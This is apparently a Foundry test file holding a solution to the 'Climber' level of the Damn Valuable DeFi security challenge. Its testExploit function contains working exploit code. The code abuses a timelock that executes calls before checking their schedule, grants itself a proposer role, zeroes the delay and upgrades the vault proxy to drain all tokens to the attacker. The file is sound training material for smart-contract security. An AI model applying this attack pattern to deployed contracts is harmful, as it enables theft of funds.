// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
import {AttackVault} from "../../../src/Contracts/attack/AttackVault.sol";
import {AttackClimber} from "../../../src/Contracts/attack/AttackClimber.sol";

contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature("initialize(address,address,address)", deployer, proposer, sweeper);
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );

        assertEq(ClimberVault(address(climberVaultProxy)).getSweeper(), sweeper);

        assertGt(ClimberVault(address(climberVaultProxy)).getLastWithdrawalTimestamp(), 0);

        climberTimelock = ClimberTimelock(payable(ClimberVault(address(climberVaultProxy)).owner()));

        assertTrue(climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer));

        assertTrue(climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer));

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        console.log(attacker);
        console.log(address(climberTimelock));
        console.log(address(climberVaultProxy));
        console.log(address(dvt));

        vm.startPrank(attacker);

        bytes32 PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

        AttackVault vaultToReplace = new AttackVault();

        AttackClimber attackClimber = new AttackClimber(
            address(climberVaultProxy),
            payable(climberTimelock),
            address(dvt),
            address(attacker)
        );

        bytes memory grantRoleData =
            abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(attackClimber));
        bytes memory updateDelayData = abi.encodeWithSignature("updateDelay(uint64)", uint64(0));
        bytes memory upgradeData = abi.encodeWithSignature("upgradeTo(address)", address(vaultToReplace));
        bytes memory attackData = abi.encodeWithSignature("attack()");

        address[] memory targets = new address[](4);
        targets[0] = address(climberTimelock);
        targets[1] = address(climberTimelock);
        targets[2] = address(climberVaultProxy);
        targets[3] = address(attackClimber);

        bytes[] memory data = new bytes[](4);
        data[0] = grantRoleData;
        data[1] = updateDelayData;
        data[2] = upgradeData;
        data[3] = attackData;

        attackClimber.setScheduleData(targets, data);

        uint256[] memory amounts = new uint256[](targets.length);
        climberTimelock.execute(targets, amounts, data, 0);

        attackClimber.withdraw();

        vm.stopPrank();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }
}
